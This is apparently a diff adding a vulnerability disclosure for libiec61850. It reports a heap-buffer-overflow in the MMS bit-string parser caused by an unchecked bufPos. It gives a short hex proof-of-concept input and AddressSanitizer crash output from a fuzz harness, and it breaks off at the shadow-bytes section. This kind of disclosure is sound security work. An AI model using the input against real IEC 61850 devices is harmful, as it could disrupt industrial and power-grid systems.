@@ -1,0 +1,34 @@
+issue: #200
+When libiec61850 parsing type MMS_BIT_STRING, it doesn't check variable bufPos. So we can provide a larger number for bufPos, then memory copy from buffer + bufPos + 1 lead to heap overflow.
+
+poc:
+a20c 8406 1600 0002 009d 8000 8000 006b
+
+result:
+gdb-peda$ r  < ./poc
+Starting program: /home/casper/targets/struct/libiec61850/afl/fuzzrun/fuzzmmsdata < poc
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+=================================================================
+==24475==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000013 at pc 0x0000004a6864 bp 0x7fffffffe050 sp 0x7fffffffd800
+WRITE of size 5 at 0x602000000013 thread T0
+[New process 26870]
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+process 26870 is executing new program: /home/casper/fuzz/fuzzdeps/llvm9/bin/llvm-symbolizer
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+    #0 0x4a6863 in __asan_memcpy /home/casper/fuzz/fuzzdeps/llvm-9.0.0.src/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:22
+    #1 0x7ffff791103c in MmsValue_decodeMmsData /home/casper/targets/struct/libiec61850/afl/SRC/src/mms/iso_mms/server/mms_access_result.c:231:9
+    #2 0x7ffff791174c in MmsValue_decodeMmsData /home/casper/targets/struct/libiec61850/afl/SRC/src/mms/iso_mms/server/mms_access_result.c:200:38
+    #3 0x4ebb1e in main /home/casper/targets/struct/libiec61850/afl/../fuzzsrc/fuzzmmsdata.c:12:21
+    #4 0x7ffff683db96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310
+    #5 0x41ad59 in _start (/home/casper/targets/struct/libiec61850/afl/fuzzrun/fuzzmmsdata+0x41ad59)
+
+0x602000000013 is located 0 bytes to the right of 3-byte region [0x602000000010,0x602000000013)
+allocated by thread T0 here:
+    #0 0x4a7a98 in calloc /home/casper/fuzz/fuzzdeps/llvm-9.0.0.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:154
+    #1 0x7ffff7b718ed in Memory_calloc /home/casper/targets/struct/libiec61850/afl/SRC/hal/memory/lib_memory.c:59:20
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /home/casper/fuzz/fuzzdeps/llvm-9.0.0.src/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:22 in __asan_memcpy
+Shadow bytes around the buggy address:
